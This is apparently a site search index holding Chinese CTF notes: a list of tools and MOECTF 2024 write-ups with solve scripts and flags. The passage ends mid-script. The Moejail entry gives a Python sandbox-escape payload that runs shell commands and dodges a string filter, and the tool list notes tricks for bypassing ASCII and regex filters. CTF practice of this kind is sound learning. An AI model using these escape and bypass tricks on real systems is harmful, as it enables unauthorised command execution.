</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_6","title":"\u97f3\u9891\u7c7b","text":"<ul> <li>audio-decoder-adaptive<ul> <li>\u76f4\u63a5\u6839\u636e\u97f3\u9891\u81ea\u5df1\u89e3\u83ab\u65af\u5bc6\u7801</li> </ul> </li> <li>slienteye</li> <li>audacity</li> <li>\u5e38\u89c1\u9898\u578b</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#osint","title":"OSINT","text":"<p>Question</p> <p>\u4ec0\u4e48\u662f OSINT \uff1f</p> <ul> <li> <p>Digital-Privacy</p> <ul> <li>\u4e00\u4e2a\u5de8\u5927\u7684\u5f00\u6e90\u4fe1\u606f\u7ad9\u70b9\u6536\u96c6\u9879\u76ee</li> </ul> </li> <li> <p>\u8c37\u6b4c\u5730\u56fe</p> </li> <li>\u767e\u5ea6\u5730\u56fe</li> <li>\u9ad8\u5fb7\u5730\u56fe</li> <li>saucenao</li> <li>GeoSpy<ul> <li>\u6839\u636e\u56fe\u7247\u4f7f\u7528 AI \u5bfb\u627e\u5730\u70b9\uff08\u5f53\u7136\uff0c\u4e0d\u662f\u5f88\u51c6\uff0c\u4f46\u662f\u4ed6\u7684\u63cf\u8ff0\u4e2d\u53ef\u80fd\u4f1a\u6709\u4f60\u672c\u6765\u6ca1\u6ce8\u610f\u5230\u7684\u5730\u65b9\uff09</li> </ul> </li> <li>\u592a\u9633\u89d2\u5ea6\u3001\u9634\u5f71\u957f\u5ea6\u7b49\u592a\u9633\u76f8\u5173<ul> <li>suncalc</li> <li>\u65f6\u95f4\u2192\u4f4d\u7f6e\u4e92\u76f8\u4f30\u8ba1</li> </ul> </li> <li>\u98de\u673a\u822a\u73ed\u4fe1\u606f<ul> <li>-flightaware</li> <li>-flightradar24</li> <li>-adsbexchange</li> <li>\u4f30\u8ba1\u65b9\u5411\uff0c\u4f4d\u7f6e\uff0c\u65f6\u95f4\u7b49</li> </ul> </li> <li>\u98ce\u666f\u4fe1\u606f\u2192Yandex \u641c\u7d22</li> <li> <p>\u5929\u6c14\u4fe1\u606f\u3001\u4e91\u5c42\u4fe1\u606f\u7b49</p> </li> <li> <p>web archive</p> <ul> <li>\u7f51\u9875\u5b58\u6863</li> </ul> </li> <li> <p>\u7f51\u7edc\u7a7a\u95f4\u641c\u7d22</p> <ul> <li>-\u949f\u9997\u4e4b\u773c</li> <li>-fofa</li> <li>-shodan</li> </ul> </li> <li>codesearch</li> <li>sourcegraph</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_7","title":"\u6d41\u91cf\u5206\u6790","text":"<ul> <li>wireshark</li> <li>PcapNG File Format</li> </ul> <ul> <li>CSDN \u2014\u2014 pcapng \u6587\u4ef6\u683c\u5f0f<ul> <li>\u6587\u4ef6\u63d0\u53d6</li> </ul> </li> <li>pcap fix</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_8","title":"\u5185\u5b58\u53d6\u8bc1","text":"<ul> <li>volatility foundation<ul> <li>csdn-volatility \u7684\u5b89\u88c5\u4e0e\u4f7f\u7528</li> </ul> </li> <li> <p>-LovelyMem</p> </li> <li> <p>ctf101-misc</p> </li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_9","title":"\u533a\u5757\u94fe\u4e0e\u4ee5\u592a\u574a","text":"<ul> <li>remix<ul> <li>solidity \u5728\u7ebf\u7f16\u8f91\u5e73\u53f0</li> </ul> </li> <li>ethernaut<ul> <li>\u8457\u540d\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u5165\u95e8\u9898\u76ee\u96c6</li> <li>Youtube\u4e0a\u7684\u8bb2\u89e3</li> </ul> </li> <li>powfaucet<ul> <li>sepolia \u4e2d ETH \u7684\u83b7\u53d6\u6e90</li> </ul> </li> <li>Ethereum Unit Converter</li> <li>\u9e64\u7fd4\u4e07\u91cc\u2014\u2014\u4ee5\u592a\u574a\u533a\u5757\u94fe\u5408\u7ea6\u5b89\u5168\u57fa\u7840</li> <li>-chainflag</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_10","title":"\u7b80\u5355\u7f16\u89e3\u7801","text":"<ul> <li>CyberChef<ul> <li>\u8d5b\u535a\u53a8\u5b50</li> </ul> </li> <li>ciphey<ul> <li>\u81ea\u79f0\u5feb\u4e8e CyberChef\uff0c\u4e14\u6355\u83b7\u7c7b\u4f3c\u4e8e flag{content} \u7684\u7ed3\u679c\uff08\u5982\u679c\u5b9e\u9645\u7684 flag \u6bd4\u8f83\u5947\u602a\uff0c\u6216\u8005\u6709\u4e00\u5c42\u6df7\u6dc6\u4e4b\u7c7b\u7684\uff0c\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u89e3\u51fa\uff09</li> <li>\u57fa\u672c\u4f7f\u7528\uff1a<ul> <li><code>ciphey -t \"encode_flag\"</code></li> <li><code>ciphey -f flag.txt</code></li> </ul> </li> </ul> </li> <li>python-codext<ul> <li>\u80fd\u5728 python \u4e2d\u4f7f\u7528\uff0c\u4e5f\u80fd\u5728\u547d\u4ee4\u884c\u4f7f\u7528</li> </ul> </li> <li>CaptfEncoder</li> <li>Tupper's self-referential formula<ul> <li>tuppers-formula</li> </ul> </li> <li>Zero-Width Characters<ul> <li>zero-width-web</li> </ul> </li> <li>-basecrack &lt;- base \u7cfb\u5217\u7206\u7834<ul> <li>-base64decode \u8fd8\u652f\u6301\u6587\u4ef6\u89e3\u7801</li> </ul> </li> <li>\u952e\u76d8\u6309\u952e\u4ee3\u7801</li> <li> <p>\u65b0\u4f5b\u66f0</p> </li> <li> <p>CTF \u5e38\u89c1\u7f16\u7801\u53ca\u52a0\u89e3\u5bc6</p> </li> <li>Crypto CTFs Tricks</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_11","title":"\u5176\u4ed6","text":"<ul> <li>Poppler (software)<ul> <li>\u5904\u7406 pdf \u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002</li> </ul> </li> <li>igfonts or Italic Text Generator<ul> <li>\u751f\u6210 Unicode \u6df7\u6dc6\u5b57\u7b26\uff0c\u7ed5\u8fc7 ASCII \u8fc7\u6ee4</li> </ul> </li> <li>Alternate Data Streams (ADS)<ul> <li></li> </ul> </li> <li>hex<ul> <li>\u5728\u7ebf\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668</li> </ul> </li> <li>List_of_file_signatures</li> <li>NATO phonetic alphabet</li> <li>-VirusTotal<ul> <li>\u6587\u6863\u3001url \u7b49\u75c5\u6bd2\u68c0\u6d4b</li> </ul> </li> <li>whitespace<ul> <li>\u5947\u5947\u602a\u602a\u7684\u7f16\u7a0b\u8bed\u8a00\uff1b\u5c45\u7136\u6709\u5728\u7ebf\u7f16\u8bd1\u80fd\u8fd0\u884c\u5b83</li> <li>-ideone</li> </ul> </li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#crypto","title":"Crypto","text":"<p>\u4e5f\u8bb8\u5206\u7c7b\u6ca1\u90a3\u4e48\u6b63\u786e\uff0c\u4e3b\u8981\u662f\u5426\u9700\u8981\u4e00\u4e9b\u6570\u5b66\u77e5\u8bc6\u6765\u533a\u5206\u53e4\u5178\u5bc6\u7801\u548c\u73b0\u4ee3\u5bc6\u7801\u3002</p> <ul> <li>practicalcryptography</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_12","title":"\u53e4\u5178\u5bc6\u7801\u5b66","text":"<ul> <li>quipqiup or  SubstitutionBreaker<ul> <li>\u6362\u4f4d\u5bc6\u7801</li> </ul> </li> <li>Boxentriq<ul> <li>Code-Breaking, Cipher and Logic Puzzles Solving Tools</li> <li>cipher identifier</li> <li>caesar-cipher</li> <li>-vigenere-cipher</li> </ul> </li> <li>-Vigen\u00e8re Solver or -Vigenere<ul> <li>\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u591a\u633a\u591a\u7684\uff0c\u4e0d\u77e5\u9053\u54ea\u4e2a\u597d\u7528\u4e00\u4e9b\uff1b\u5bc6\u94a5\u957f\u5ea6\u8d85\u8fc7 30 \u5c31\u522b\u60f3\u7740\u80fd\u76f4\u63a5\u7206\u7834\u4e86\u2026\u2026</li> </ul> </li> <li>codecs or codext<ul> <li>\u66f4\u5168\u7684\u89e3\u7801 python \u5e93</li> </ul> </li> <li>\u4e0d\u660e\u89c9\u5389\u7cfb\u5217\uff1a<ul> <li>-dcode</li> <li>-dencode</li> </ul> </li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_13","title":"\u73b0\u4ee3\u5bc6\u7801\u5b66","text":"<ul> <li>factordb<ul> <li>\u5927\u6570\u56e0\u5f0f\u5206\u89e3\uff0c\u652f\u6301\u7684\u6570\u636e\u5927\u5c0f\u662f\u6211\u6240\u89c1\u8fc7\u6700\u5927\u7684\uff1b</li> <li>factordb-python \u672c\u5730\u8fd0\u884c\u3002</li> </ul> </li> <li>OEIS<ul> <li>\u5728\u7ebf\u6574\u6570\u5e8f\u5217\u767e\u79d1\u5168\u4e66\uff08On-Line Encyclopedia of Integer Sequences\uff09</li> </ul> </li> <li>proofWiki<ul> <li>\u6570\u5b66\u6027\u8d28\uff08\u8bc1\u660e\uff09\u67e5\u627e</li> </ul> </li> <li>Sage math<ul> <li>sagecell online</li> <li>sage document<ul> <li>Cryptography part</li> </ul> </li> <li>\u5b66\u4e60\u8bb0\u5f55</li> </ul> </li> <li>GmSSL<ul> <li>\u56fd\u4ea7\u5546\u7528\u5bc6\u7801\u5f00\u6e90\u5e93</li> </ul> </li> <li>SSL tools</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_14","title":"\u5e38\u7528\u653b\u51fb\u811a\u672c","text":"<ul> <li>RsaCtfTool</li> <li>-PadBuster</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#web","title":"Web","text":"<ul> <li>Githack</li> <li>DNS lookup</li> <li>JWT</li> <li>BurpSuite<ul> <li>BurpSuite \u914d\u7f6e</li> </ul> </li> <li> <p>regex101</p> <ul> <li>\u53ef\u4ee5 debug \u770b\u5230\u8be6\u7ec6\u7684\u6b63\u5219\u5339\u914d\u8fc7\u7a0b\uff0c\u7136\u540e\u5229\u7528\u5339\u914d\u6b65\u6570\u9650\u5236\u6765\u7ed5\u8fc7\u68c0\u6d4b</li> </ul> </li> <li> <p>csdn-webshell \u5de5\u5177\u6d41\u91cf\u7279\u5f81\u5206\u6790</p> </li> <li>CTF Web\u4fe1\u606f\u641c\u96c6</li> <li>JS \u603b\u7ed3<ul> <li>-CTF\u6bd4\u8d5b\u4e2d\u5173\u4e8ejavascript\u7684\u603b\u7ed3</li> <li>-2022 \u5e74 CTF Web \u524d\u7aef\u8207 JS \u984c\u7e3d\u7d50</li> </ul> </li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#_15","title":"\u6cdb\u5de5\u5177\u7bb1","text":"<ul> <li>CTFtools-wiki</li> <li>Hello-ctf toolkit</li> <li>ctf-tools</li> <li>https://blog.51cto.com/hsqcpp/7939098</li> <li>Awesome-CTF</li> <li>CTFNOTE</li> <li>-ctfever</li> <li>-bugku</li> <li>-Openctf\u7684\u5de5\u5177\u7bb1</li> <li>UU\u5728\u7ebf\u5de5\u5177<ul> <li>\u6587\u672c\u6587\u4ef6\u5408\u5e76</li> </ul> </li> </ul>","tags":["ctf","collection"]},{"location":"CTF/Tools/#ctf101","title":"CTF101","text":"<ul> <li>Flag\u63d0\u4ea4\u7f51\u7ad9</li> <li>\u5b9e\u9a8c\u7f51\u7ad9</li> <li>\u667a\u4e91\u94fe\u63a5</li> <li>\u4e00\u4e2a\u5c0f\u603b\u7ed3</li> </ul>","tags":["ctf","collection"]},{"location":"CTF/MOECTF2024/","title":"MOECTF2024","text":"","tags":["ctf"]},{"location":"CTF/MOECTF2024/#link","title":"link","text":"<ul> <li>MOECTF 2024 \u8bad\u7ec3\u5e73\u53f0</li> <li>Github moectf2024 \u5b58\u6863</li> <li>Github moectf2023 \u5b58\u6863</li> </ul>","tags":["ctf"]},{"location":"CTF/MOECTF2024/#summary","title":"summary","text":"<p>\u5199\u7684\u6700\u591a\u7684\u4e00\u6b21\u6bd4\u8d5b\u4e86\uff0c\u4e5f\u662f\u7b2c\u4e00\u4e2a\u590d\u76d8\u7684\u6bd4\u8d5b\u3002</p> <p>\u56e0\u4e3a\u9898\u76ee\u7c7b\u578b\u5f88\u4e30\u5bcc\uff0c\u68af\u5ea6\u6bd4\u8f83\u5408\u9002\uff0c\u7f51\u7ad9 UI \u4e5f\u5f88\u4e0d\u9519\u3002</p> <p>\u8fc7\u7a0b\u6750\u6599\u4f4d\u4e8e https://github.com/Darstib/CTF/ \u6587\u4ef6\u5939\u4e0b\uff08\u8fd8\u6ca1\u653e\u5462\uff0c\u6316\u5751\uff09</p>","tags":["ctf"]},{"location":"CTF/MOECTF2024/#writeup","title":"writeup","text":"MOECTF 2024          <ul> <li> MISC  1876  276  10 mins              1739718485 </li> <li> WEB  1531  315  9 mins              1739718485 </li> <li> CRYPTO  79  84  1 mins              1739718485 </li> <li> AI  52  0 mins              1739718485 </li> </ul>","tags":["ctf"]},{"location":"CTF/MOECTF2024/AI/","title":"AI","text":"","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/AI/#neuro","title":"Neuro?","text":"<p>Flag</p> <p>moectf{2e1269e90173a11b}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/AI/#_1","title":"\u5e76\u975e\u52a9\u624b","text":"<p>LLM \u7684\u672c\u8d28\u662f\u6587\u5b57\u63a5\u9f99</p> <p></p> <p>Flag</p> <p>moectf{28aad9a0b6f41a7a}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/AI/#_2","title":"\u5e76\u975e\u5e76\u975e","text":"<p>\u7ed3\u679c\u662f\uff0c\u4e0b\u9762\u7684\u5185\u5bb9\u53ea\u662f\u968f\u673a\u4ea7\u751f\u7684\u5185\u5bb9\uff0c\u548c\u7b54\u6848\u4e0d\u6cbe\u8fb9\u3002</p> <p></p> <p></p> <p></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/CRYPTO/","title":"CRYPTO","text":"","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/CRYPTO/#baby_equation","title":"baby_equation","text":"<p>\u7531\u56e0\u5f0f\u5206\u89e3\uff1a <code>((a**2 + 1) * (b**2 + 1) - 2 * (a - b) * (a * b - 1)) == 4 * (k + a * b) =&gt; ((a+1)*(b-1))**2 == 4*k</code> \uff0c\u663e\u7136\u6211\u4eec\u53ef\u4ee5\u5c06 <code>(a+1)(b-1)</code> \u8ba1\u7b97\u51fa\u6765\uff0c\u518d\u7528 factordb \u5c06\u5176\u5206\u89e3\uff0c\u83b7\u5f97 a/b \u7684\u53ef\u80fd\u503c\u5e76\u6c42\u89e3\u3002</p> baby_equation.py<pre><code>from Crypto.Util.number import *\n\n# from secret import flag\n\n\n# l = len(flag)\n# m1, m2 = flag[: l // 2], flag[l // 2 :]\n# a = bytes_to_long(m1)\n# b = bytes_to_long(m2)\nk = 0x2227E398FC6FFCF5159863A345DF85BA50D6845F8C06747769FEE78F598E7CB1BCF875FB9E5A69DDD39DA950F21CB49581C3487C29B7C61DA0F584C32EA21CE1EDDA7F09A6E4C3AE3B4C8C12002BB2DFD0951037D3773A216E209900E51C7D78A0066AA9A387B068ACBD4FB3168E915F306BA40\n# assert ((a**2 + 1) * (b**2 + 1) - 2 * (a - b) * (a * b - 1)) == 4 * (k + a * b)\n# =&gt; ((a+1)*(b-1))**2 == 4*k\n\nimport math\n\nt = 2 * int(math.isqrt(k))\nassert t**2 == 4 * k  # AssertionError\n\n# print(t)\n# t== (2**4) * (3**2) * 31 * 61 * 223 * 4013 * 281317 * 4151351 * 339386329 * 370523737 * 5404604441993 * 26798471753993 * 25866088332911027256931479223 * 64889106213996537255229963986303510188999911\n\nfactors = (\n    [2] * 4\n    + [3] * 2\n    + [\n        31,\n        61,\n        223,\n        4013,\n        281317,\n        4151351,\n        339386329,\n        370523737,\n        5404604441993,\n        26798471753993,\n        25866088332911027256931479223,\n        64889106213996537255229963986303510188999911,\n    ]\n)\n\nfrom itertools import chain, combinations\n\n\ndef powerset(iterable):\n    \"\u751f\u6210\u53ef\u8fed\u4ee3\u5bf9\u8c61\u7684\u6240\u6709\u5b50\u96c6\"\n    s = list(iterable)\n    return chain.from_iterable(combinations(s, r) for r in range(len(s) + 1))\n\n\nxs = set()  # \u4f7f\u7528\u96c6\u5408\u6765\u5b58\u50a8\u7ed3\u679c\uff0c\u907f\u514d\u91cd\u590d\n\nfor subset in powerset(factors):\n    product = 1\n    for num in subset:\n        product *= num\n    xs.add(product)\n\nxs = list(xs)  # \u5c06\u96c6\u5408\u8f6c\u6362\u4e3a\u5217\u8868\nxs.sort()  # \u5bf9\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\n\nwith open(\"tmp.txt\", \"w\") as f:\n    for x in xs:\n        a = x - 1\n        b = t // x + 1\n        m1 = long_to_bytes(a)\n        m2 = long_to_bytes(b)\n        flag = \"\".join(chr(c) for c in (m1 + m2) if 32 &lt;= c &lt; 127)\n        if flag.startswith(\"moectf{\"):\n            print(flag)\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/CRYPTO/#ez_hash","title":"ez_hash","text":"<p>\u76f4\u63a5\u7206\u7834\u5373\u53ef\uff1b\u63d0\u524d\u751f\u6210\u901f\u5ea6\u66f4\u5feb\uff1f</p> ez_hash.py<pre><code>import hashlib\nimport itertools\nfrom string import digits, ascii_letters, punctuation\n\nalpha_bet = digits + ascii_letters + punctuation\nstrlist = itertools.product(digits, repeat=6)\n\nfor strl in strlist:\n    strl = \"2100\" + \"\".join(strl)\n    if (\n        hashlib.sha256(strl.encode()).hexdigest()\n        == \"3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a\"\n    ):\n        print(strl)\n        break\n</code></pre> <p>Flag</p> <p>moectf{2100360168}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/","title":"MISC","text":"","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#ctfer2077","title":"ctfer2077","text":"","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#1","title":"1","text":"<p>\u4e8c\u7ef4\u7801\u626b\u4e86\uff0c\u5f53\u7136\u662f\u88ab\u9a97\u4e86\uff1b\u7ee7\u7eed\u770b\uff0c\u7528 zsteg \u63d0\u53d6\u51fa\uff1a<code>where is the flag ? OK I give you some hints:incomplete LSB</code> =&gt;  <code>b1,r,lsb,xy .. text:**\u00a0\"flag is moectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}\"</code></p> <p>Flag</p> <p>moectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#2","title":"2","text":"<p><code>\"key\u5728\u8fd9\u4e2a\u52a0\u5bc6\u5377\u91cc\uff0c\u6211\u53ea\u77e5\u9053\u5bc6\u7801\u662f'\u6cd5\u6cbb\u5bcc\u5f3a\u81ea\u7531\u5bcc\u5f3a\u548c\u8c10\u5e73\u7b49\u548c\u8c10\u5e73\u7b49\u6cd5\u6cbb\u6cd5\u6cbb\u548c\u8c10\u5bcc\u5f3a\u6cd5\u6cbb\u6587\u660e\u516c\u6b63\u81ea\u7531'\uff0c\u4ed6\u5b9d\u8d1d\u7684\uff0c\u53ea\u80fd\u9760\u4f60\u81ea\u5df1\u89e3\u5bc6\u4e86\u3002\"</code> =&gt; <code>p@55w0rd</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#nnnnext","title":"\u5c0f\u5c0f\u5957\u5a03\uff08nnnnext\uff09","text":"<p>\u53c2\u8003\uff1ahttps://blog.csdn.net/qq_34204534/article/details/142861124</p> <p>pngcheck \u68c0\u67e5\u53d1\u73b0\u5012\u6570\u7b2c\u4e8c\u4e2a IDAT \u5757\u6ca1\u6ee1\uff0c\u8bf4\u660e\u6700\u540e\u4e00\u5757\u662f\u624b\u52a8\u52a0\u4e0a\u53bb\u7684\uff0cbinwalk \u5206\u79bb\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u811a\u672c\u63d0\u53d6\u51fa tmp.png\uff1a</p> zlib_decompress.py<pre><code>import zlib\n\nwith open(\"634D4.zlib\", \"rb\") as f:\n    compressed_data = f.read()\n\ndecompressed_data = zlib.decompress(compressed_data).decode()\n\nbinary_stream = bytes.fromhex(decompressed_data)\nwith open(\"tmp.png\", \"wb\") as p:\n    p.write(binary_stream)\n</code></pre> <p>\u5f97\u5230 tmp.png \uff0c\u626b\u7801\u83b7\u5f97\uff1a</p> <p>\u9001\u4f60\u4e00\u4e2a key\uff01you've got the zipkey:<code>874jfy37yf37y7</code></p> <p>\u89e3\u538b\u540e\u5148\u770b whereisthekey.txt \uff0c\u5c45\u7136\u662f zero-width character\uff0c\u4f7f\u7528 zero-width-web \u89e3\u5f97 <code>idon'tknowmaybeits:dhufhduh48589</code></p> <p>\u7ee7\u7eed\u89e3\u538b\u4e8c\u7ef4\u7801\uff0c\u83b7\u5f97\uff1a<code>\u65b0\u4f5b\u66f0\uff1a\u8af8\u96b8\u95a6\u50e7\u964d\u543d\u8af8\u95a6\u9640\u6469\u96b8\u50e7\u871c\u5ff5\u871c\u52ab\u54c6\u54a4\u82e5\u561a\u95a6\u5607\u7f3d\u96b8\u6240\u7f85\u95a6\u52ab\u8af8\u8ae6\u82e5\u5fc3\u83e9\u5492\u95a6\u5373\u6240\u7a7a\u6469\u50e7\u95a6\u5f4c\u5c0a\u7f85\u5f4c\u6240\u773e\u82e5\u5f4c\u543d\u5c0a\u8272\u8a36\u95a6\u7a7a\u7a7a\u95a6\u6469\u5373\u95a6\u56a4\u871c\u8272\u56b4\u7a7a\u5373\u65af\u8a36\u5f4c\u8272\u7a7a\u56b4\u56b4\u8272\u9640\u95a6\u963f\u964d\u5982\u5982\u56d1\u56d1</code> \u663e\u7136\u662f\u4ec0\u4e48\u4e0e\u4f5b\u8bba\u7985\uff1b\u4f46\u662f\u8bd5\u4e86\u51e0\u4e2a\u5de5\u5177\uff0c\u53ea\u6709\u8fd9\u4e2a\u80fd\u89e3\u51fa\u6765\uff1a<code>\u5f17\u62c9\u683c\u662f{sfdh8334r784jfx_sdjjuhreubc}</code></p> <p>Flag</p> <p>moectf{sfdh8334r784jfx_sdjjuhreubc}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#_1","title":"\u65f6\u5149\u7a7f\u68ad\u673a","text":"<ul> <li>\u8bc4\u300a\u7ef4\u591a\u5229\u4e9a\u65f6\u4ee3\u7684\u4e2d\u56fd\u56fe\u50cf\u300b or \u8bc4\u300a\u7ef4\u591a\u5229\u4e9a\u65f6\u4ee3\u7684\u4e2d\u56fd\u56fe\u50cf\u300b\uff1a\u4ee5\u56fe\u8bc1\u53f2\u7684\u4ed6\u5c71\u4e4b\u77f3</li> <li>\u9ad8\u5fb7\u5730\u56fe\u2014\u2014\u738b\u5efa\u5893</li> </ul> <p>\u4f46\u662f\u533b\u9662\u6ca1\u627e\u5230\u2026\u2026\u770b\u4e86 writeup</p> <p>Flag</p> <p>moectf{han_fang_tang}</p> <p>\u79bb\u8c31\uff0c\u9ad8\u5fb7\u5730\u56fe\u4e0a\u53eb\u201c\u91d1\u725b\u533a\u6c49\u65b9\u5802\u517b\u751f\u9986\u201d\uff0c\u767e\u5ea6\u5730\u56fe\u4e0a\u53eb\u201c\u6210\u90fd\u91d1\u725b\u6c49\u65b9\u5802\u4e2d\u533b\u95e8\u8bca\u90e8\u201d\uff0c\u600e\u4e48\u8ba4\u4e3a\u4ed6\u662f\u4e2d\u533b\u9662\uff0c\u53c8\u600e\u4e48\u5c31\u76f4\u63a5\u622a\u53d6\u6c49\u65b9\u5802\u4e86\u2026\u2026</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#_2","title":"\u6211\u7684\u56fe\u5c42\u5728\u4f60\u4e4b\u4e0a","text":"<p>\u7206\u7834\u83b7\u5f97\u5bc6\u7801 <code>p_w_d</code>\uff1b\u89e3\u538b\u83b7\u5f97 <code>zbrpgs{q751894o-rr0n-47qq-85q4-r92q0443921s}</code></p> <p></p> <p>Flag</p> <p>moectf{d751894b-ee0a-47dd-85d4-e92d0443921f}</p> <p>\u7ed9\u6211\u4eec black.pdf \u662f\u5e72\u5565\u7684\uff1f\u7528 Poppler (software) \u4e2d\u7684 pdftohtml\uff0c\u67e5\u770b\u9ed1\u8272\u56fe\u7247\u7684 lsb =&gt; key=p_w_d</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#readme","title":"readme","text":"<p>\u8fd9\u9898\u7684\u4ea4\u4e92\u548c Moejail \u5f88\u50cf\uff0c\u76f4\u63a5\u7528 moejail lv2 \u5904\u5199\u7684\u811a\u672c\u4e86\u3002</p> <p>\u4e0d\u8fc7\u95ee\u7684\u5185\u5bb9\u53d8\u6210\u4e86 <code>What file you want to view?</code> \u53ea\u8ba9\u770b\u6587\u4ef6\uff1f</p> <p>\u53ef\u4ee5\u770b\u5230\u662f\u5199\u5165\u4e86 <code>/tmp/therealflag</code> \u540e\u5feb\u901f\u5220\u9664\u4e86\uff1b\u76f4\u63a5\u67e5\u770b\u66f4\u662f\u663e\u793a\u62d2\u7edd\u3002</p> <p>\u770b\u5230\u63d0\u793a \u201c\u6587\u4ef6\u771f\u7684\u88ab\u5220\u4e86\u5417\uff1f\u5982\u5220\u201d\uff0c\u4f30\u8ba1\u662f\u8fd0\u884c\u8fdb\u7a0b\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\uff1b\u8fd0\u7528\u5728 pwn \u4e2d\u5b66\u5230\u7684\u77e5\u8bc6<sup>1</sup>\uff0c\u6211\u4eec\u67e5\u770b <code>/proc/self/fd/3</code> \uff08\u770b\u4e86\u9898\u89e3\uff0c\u4e0d\u7136\u4e00\u4e2a\u4e00\u4e2a\u627e\u5427\uff09 \u62ff\u5230 flag</p> <p>Flag</p> <p>moectf{oHHHH-mAN-lt-i5-tHe_TrUe-S1MPL3_R3@deR235b}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#_3","title":"\u6342\u4f4f\u4e00\u53ea\u8033","text":"<p>\u97f3\u9891 1 \u5206\u949f\u540e\u51fa\u73b0\u4fe1\u606f\uff1a<code>ok? 63 31 43 31 41 52 31 51 71 101</code> ascii \uff1f\u6ca1\u731c\u51fa\u6765\u3002</p> <p>\u770b\u4e86\u9898\u89e3\uff0c\u7b2c\u4e00\u4f4d\u6570\u5b57\u5bf9\u5e94\u952e\u76d8\u4e0a\u4e0a\u8fb9\u4e00\u884c\u6570\u5b57\uff0810-&gt;0\uff09\uff0c\u7b2c\u4e8c\u4f4d\u4e3a\u5bf9\u5e94\u5217\u7684\u5e8f\u53f7\uff1b\u52a0\u4e0a\u6309\u4e86 Caps \u952e\uff0c\u6545\u5168\u4e3a\u5927\u5199\uff1a</p> <p>Flag</p> <p>moectf{NEVERGETUP}</p> <p>\u53ef\u60dc\uff0c\u5f53\u65f6\u548c\u5176\u4ed6\u4eba\u8ba8\u8bba\u7684\u65f6\u5019\u60f3\u5230\u6700\u540e\u4e00\u4f4d\u53ea\u80fd\u662f 1/2/3\uff0c\u8003\u8651\u662f\u624b\u673a\u4e0a\u7684 9 \u5bab\u683c\u8f93\u5165\u6cd5\uff0c\u4f46\u662f\u4e5d\u5bab\u683c\u8f93\u5165\u6cd5\u53ea\u6709 8 \u4e2a\u6309\u952e\u6709\u5177\u4f53\u5b57\u6bcd\u2026\u2026</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#moejail","title":"Moejail","text":"","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#lv1","title":"lv1","text":"<p>\u6839\u636e\u8981\u6c42\u62fc\u63a5\u5b57\u7b26\u4e32\u540e\u5141\u8bb8\u6211\u4eec\u6ce8\u5165 payload\uff0c\u7b80\u5355\u5c1d\u8bd5\u540e\u53d1\u73b0 <code>__import__('so'[::-1]).system('ls')</code> \u662f\u53ef\u884c\u7684\uff0c\u5c06 <code>ls</code> \u6362\u4e3a\u9700\u8981\u6267\u884c\u7684\u8bed\u53e5\u5373\u53ef\u3002</p> <p>\u6839\u636e\u63d0\u793a\uff0c\u5728 <code>/tmp/</code> \u4e0b\uff0c\u6ce8\u610f\u4f7f\u7528 <code>ls -a</code> \u663e\u793a\u5168\u90e8\uff0c\u4e4b\u540e\u60f3\u8981\u67e5\u770b\u6587\u4ef6\uff0c\u4f46\u662f\u56e0\u4e3a\u6587\u4ef6\u540d\u5bfc\u81f4\u547d\u4ee4\u592a\u957f\u4e86\uff0c\u4f7f\u7528 <code>*</code> \u8fdb\u884c\u5339\u914d\u5373\u53ef\uff1a</p> <p></p> <p>Flag</p> <p>moectf{Ah_HA-nOW-Y0u_KNoW_H0w_T0_EsCApE-SIMpL3_5trlng_fILter0}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#lv2","title":"lv2","text":"<p>\u540e\u9762\u7684\u7cfb\u5217\u9898\u4ea4\u4e92\u662f\u7c7b\u4f3c\u7684\uff0c\u6545\u4f7f\u7528 python \u4ea4\u4e92\u5427\uff1a</p> moejail.py<pre><code>from pwn import *\nimport re\n\nport = 57536  # \u7aef\u53e3\u66ff\u6362\n# \u542f\u7528debug\u6a21\u5f0f\ncontext.log_level = \"debug\"\n\n# \u5efa\u7acb\u8fde\u63a5\nconn = remote(\"127.0.0.1\", port, timeout=2)\n\n# Replace the existing conn.recvuntil() call 